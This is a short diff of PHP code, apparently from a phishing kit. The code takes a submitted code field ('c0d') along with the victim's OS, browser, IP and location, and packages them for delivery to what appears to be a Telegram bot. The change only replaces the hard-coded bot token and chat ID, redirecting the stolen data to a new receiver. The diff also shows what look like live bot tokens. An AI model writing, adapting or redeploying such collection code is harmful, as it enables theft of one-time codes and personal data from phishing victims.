@@ -74,11 +74,11 @@ if ( isset ($_POST['c0d']) ){
 
 $message = "C0dig0: ".$_POST['c0d']." \r\n";
 $message .= " SO= ".$user_os." ".$navegador." ".$userp." ".$pais." ".$region." ".$ciudad."\r\n";
-$apiToken = "5421742969:AAHrpNO1bIkBoHoxIXth_aZMQ4zhsLm8rOY";
+$apiToken = "5338937969:AAFrrJvtWJi_O-RDz5a3YuLhC8tF1hBgkM4";
 
 
 $data = [
-  'chat_id' => '2088492280',
+  'chat_id' => 'sisaxd1',
 
    'text' => $message
 ];
